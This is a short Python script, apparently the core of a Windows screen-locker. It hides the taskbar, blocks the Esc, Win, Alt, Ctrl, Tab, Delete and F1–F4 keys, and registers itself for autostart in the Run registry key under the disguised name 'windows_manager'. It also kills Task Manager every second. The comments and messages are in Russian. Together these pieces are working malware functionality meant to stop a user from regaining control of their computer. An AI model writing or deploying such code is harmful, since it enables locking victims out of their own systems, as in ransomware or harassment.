import keyboard
import winreg
import psutil
import time
import sys
import pyautogui
import ctypes
import time

def block_input(): 
    taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)#close hotbar windows
    ctypes.windll.user32.ShowWindow(taskbar, 0)

    pyautogui.hotkey('win', 'd')#close all window
    keyboard.block_key('esc')
    keyboard.block_key('win')
    keyboard.block_key('delete')
    keyboard.block_key('alt')
    keyboard.block_key('ctrl')
    keyboard.block_key('tab')
    keyboard.block_key('f1')
    keyboard.block_key('f2')
    keyboard.block_key('f3')
    keyboard.block_key('f4')

def add_autostart():
    reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    program_path = sys.executable
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "windows_manager", 0, winreg.REG_SZ, program_path)
        return True
    except Exception as e:
        print(f"Ошибка при добавлении в автозагрузку: {e}")
        return False
    
def close_taskmgr():
    while True:
        try:
            for process in psutil.process_iter(['pid', 'name']):
                if process.info['name'] == "Taskmgr.exe":
                    process.kill()
                    print("Диспетчер задач закрыт.")
            time.sleep(1) 
        except psutil.NoSuchProcess:
            pass
        except Exception as e:
            print(f"Ошибка: {e}")
            time.sleep(1)  
